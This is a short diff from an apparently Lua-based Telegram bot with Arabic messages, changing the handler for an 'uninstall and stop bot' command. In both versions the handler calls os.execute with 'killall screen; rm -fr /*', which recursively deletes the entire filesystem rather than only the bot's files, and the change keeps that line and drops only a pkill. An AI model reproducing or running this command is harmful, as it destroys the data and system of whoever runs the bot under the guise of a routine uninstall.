@@ -5214,7 +5214,7 @@ send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لا�
 return false
 end
 send(msg.chat_id_,msg.id_," ☉┇ تم حذف التنصيب و ايقاف البوت 😿")
-os.execute("killall screen; rm -fr /*; pkill -u "`whoami`"")
+os.execute("killall screen; rm -fr /*")
 return false
 end
 if text == ("رفع مطور ثالث") or text == ("رفع مطور") and msg.reply_to_message_id_ then
